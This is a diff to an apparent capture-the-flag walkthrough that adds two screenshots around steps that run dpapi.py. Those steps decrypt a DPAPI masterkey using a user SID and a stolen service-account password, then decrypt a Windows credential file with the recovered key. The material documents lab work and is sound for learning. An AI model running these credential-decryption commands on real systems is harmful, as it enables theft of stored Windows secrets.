@@ -170,8 +170,12 @@
 
 `dpapi.py masterkey -file dpapi2.key -sid $(cat c.neri.sid) -password $(cat ../user/svc_sql.pass)`
 
+<img width="912" height="720" alt="image" src="https://github.com/user-attachments/assets/f3e7ba12-f705-4a90-ae80-be6dc3ac4c25" />
+
 26. Now with the 2 masterkeys, we try decrypting the credential file using dpapi.py again
 
 `dpapi.py credential -file credentials.txt -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a`
+
+<img width="912" height="313" alt="image" src="https://github.com/user-attachments/assets/86f184de-577c-4c71-9462-4739b444acd7" />
 
 27. 
